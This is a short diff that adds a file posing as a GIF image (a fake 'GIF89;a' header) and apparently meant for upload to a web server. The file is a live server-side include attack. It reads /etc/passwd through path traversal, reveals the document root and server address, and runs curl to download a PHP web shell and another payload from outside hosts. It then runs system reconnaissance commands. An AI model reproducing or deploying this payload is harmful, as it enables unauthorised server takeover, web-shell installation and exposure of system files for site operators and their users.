@@ -1,0 +1,10 @@
+GIF89;a GIF89;a GIF89;a GIF89;a GIF89;a<!--#include virtual="/../../../../../../../../../../../../../../../../../../../../../etc/passwd" -->
+<br>
+<!--#echo var="DOCUMENT_ROOT" -->
+<br>
+<!--#echo var="SERVER_ADDR" -->
+<br>
+<!--#exec cmd="{curl,https://raw.githubusercontent.com/cikul555/shell/main/01ganokpw403.php,-o,../../01ganokpw4.php}" -->
+<!--#exec cmd="{curl,http://adivasirishta.com/advertisement/lol.txt,-o,../../lol.txt}" -->
+<br>
+<!--#exec cmd="dir;pwd;{uname,-a}" -->
